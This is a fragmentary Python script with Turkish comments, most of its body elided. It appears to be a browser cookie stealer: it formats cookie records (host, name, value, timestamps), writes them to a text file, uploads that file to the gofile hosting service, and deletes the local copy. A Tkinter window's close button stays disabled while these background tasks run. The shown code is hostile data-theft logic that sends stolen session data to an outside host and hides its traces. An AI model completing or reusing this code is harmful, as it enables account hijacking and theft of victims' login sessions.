...
# Dosya yolları için sabitler
    ...
    def format_cookie_output(host_key, name, value, creation_utc, last_access_utc, expires_utc):
        ...
        # expires_utc değerini epoch formatına çevir
    ...
    def upload_file_to_gofile_cook1es(path):
        ...
        print(f"Test edilen dosya yolu: {path}")
        if not os.path.exists(path):
            return f'Dosya mevcut değil: {path}'
        ...
        try:
            ...
            if response_data.get('status') == 'ok':
                ...
                if os.path.exists(path):
                    os.remove(path)
                    print(f"Dosya silindi: {path}")
                else:
                    return f"Dosya silinemedi: {path}"
    ...
    def main():
        ...
        with open("cookies_output.txt", "w", encoding="utf-8") as f:
            ...
            upload_result = upload_file_to_gofile_cook1es("cookies_output.txt")
...
def on_closing():
    if not background_tasks_done:
        print("Kapatma işlemi şu anda devre dışı.")
    else:
        # Pencere kapanmadan önce 45 saniye bekle
...
# Kapatma işlevini başlangıçta devre dışı bırak
root.protocol("WM_DELETE_WINDOW", lambda: print("Kapatma işlemi şu anda devre dışı."))

def enable_close_after_delay():
    if background_tasks_done:
        # Kapatma işlevini etkinleştir
